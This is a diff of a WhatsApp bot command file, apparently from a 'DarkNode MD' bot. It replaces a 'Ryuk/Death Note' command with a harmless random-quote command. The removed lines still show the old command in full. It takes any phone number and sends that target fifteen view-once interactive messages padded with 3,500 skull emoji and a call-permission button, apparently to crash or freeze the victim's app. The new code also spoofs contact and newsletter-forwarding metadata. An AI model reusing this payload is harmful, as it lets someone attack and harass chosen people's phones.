@@ -1,65 +1,52 @@
-// commands/ryuk.js
-const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];
+// commands/ryuk.js - Ryuk Quote
+const settings = require('../settings');
 
-async function ryukCommand(sock, chatId, message, args) {
-    if (!message.key.fromMe) {
-        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
-        return;
-    }
-
-    const targetNumber = args[0];
-    if (!targetNumber) {
-        await sock.sendMessage(chatId, { 
-            text: "🍎 *Ryuk*\n\nUsage: .ryuk <number>\nExample: .ryuk 628123456789\n\n*Death Note Activated*"
-        }, { quoted: message });
-        return;
-    }
-
-    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
-    
-    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
-        await sock.sendMessage(chatId, { text: "🛡️ *Protected by L*" }, { quoted: message });
-        return;
-    }
-
-    const target = cleanNumber + '@s.whatsapp.net';
-    
-    await sock.sendMessage(chatId, { text: `🍎 *Death Note* writing ${cleanNumber}'s name...` }, { quoted: message });
-    await sock.sendMessage(chatId, { react: { text: "🍎", key: message.key } });
-
-    try {
-        const shinigamiPayload = {
-            viewOnceMessage: {
-                message: {
-                    interactiveMessage: {
-                        contextInfo: {
-                            mentionedJid: [target],
-                            isForwarded: true,
-                            forwardingScore: 999
-                        },
-                        body: { text: "✦ Ṛɏüḳ ✦" + "💀".repeat(3500) },
-                        footer: { text: "Death Note" },
-                        nativeFlowMessage: {
-                            buttons: [
-                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "✍️ Write Name", id: "write" }) },
-                                { name: "call_permission_request", buttonParamsJson: "" }
-                            ]
-                        }
-                    }
-                }
-            }
-        };
-
-        for (let i = 0; i < 15; i++) {
-            await sock.relayMessage(target, shinigamiPayload, { participant: { jid: target } });
+const fakeMeta = {
+    key: {
+        participant: '0@s.whatsapp.net',
+        remoteJid: 'status@broadcast',
+        fromMe: false,
+        id: 'DARKNODE_META_' + Date.now()
+    },
+    message: {
+        contactMessage: {
+            displayName: 'DARKNODE MD',
+            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:DARKNODE MD;;;;\nFN:DARKNODE MD\nTEL;waid=${settings.ownerNumber}:+${settings.ownerNumber}\nEND:VCARD`,
+            sendEphemeral: true
         }
-        
-        await sock.sendMessage(chatId, { text: `✅ *Death Note* sealed ${cleanNumber}` }, { quoted: message });
-        await sock.sendMessage(chatId, { react: { text: "📓", key: message.key } });
+    },
+    messageTimestamp: Math.floor(Date.now() / 1000),
+    pushName: 'DARKNODE MD'
+};
+
+const channelInfo = {
+    contextInfo: {
+        forwardingScore: 1,
+        isForwarded: true,
+        forwardedNewsletterMessageInfo: {
+            newsletterJid: settings.newsletterJid,
+            newsletterName: settings.newsletterName,
+            serverMessageId: -1
+        }
+    }
+};
+
+async function ryukCommand(sock, chatId, message) {
+    try {
+        const quotes = [
+            '"I am the God of the new world!"',
+            '"Humans are so interesting..."',
+            '"I will become the God of this new world!"'
+        ];
+        const quote = quotes[Math.floor(Math.random() * quotes.length)];
+
+        await sock.sendMessage(chatId, {
+            text: `╭─── ⪨ 🍎 RYUK ⪩───⟢\n│ ${quote}\n╰────────────⟢\n> © DarkNode MD`,
+            ...channelInfo
+        }, { quoted: message });
 
     } catch (error) {
-        console.error('[Ryuk]', error.message);
-        await sock.sendMessage(chatId, { text: `❌ *Death Note failed:* ${error.message}` }, { quoted: message });
+        console.error('[Ryuk] Error:', error);
     }
 }
 
